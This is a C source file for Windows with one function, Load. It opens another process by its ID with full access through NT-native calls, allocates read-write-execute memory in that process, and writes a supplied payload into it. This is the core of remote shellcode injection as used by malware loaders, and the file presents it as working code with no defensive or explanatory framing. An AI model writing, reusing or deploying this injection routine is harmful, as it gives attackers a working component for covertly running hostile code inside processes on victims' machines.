#include <stdio.h>
#include <windows.h>

#include "nt.h"

LPVOID Load(DWORD Thread, BYTE *Payload, SIZE_T PayloadSize, HMODULE nt) {

        HANDLE   hProc   = NULL;
        HANDLE   hThread = NULL;
        LPVOID   Buffer  = NULL;
        SIZE_T   Written = 0;
        
        NTSTATUS Status;
    
    /////////////////////////////////////////////////

    OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL };
    CLIENT_ID cid = { (HANDLE)Thread, NULL }; 

    Status = NtOpenProc(
        &hProc,
        PROCESS_ALL_ACCESS,
        &oa,
        &cid
    );

    if (Status != STATUS_SUCCESS || !hProc) { return NULL; }

    /////////////////////////////////////////////////

    Status = NtVirtAlloc(
        hProc,
        &Buffer,
        0,
        &PayloadSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (Status != STATUS_SUCCESS || !Buffer) { 
        CloseHandle(hProc);
        return NULL;
    }

    /////////////////////////////////////////////////

    Status = NtWriteVirtMem(
        hProc,
        Buffer,
        Payload,
        PayloadSize,
        &Written
    );

    CloseHandle(hProc);

    if (Status != STATUS_SUCCESS || Written != PayloadSize) {
        return NULL;
    }

    return Buffer;
}
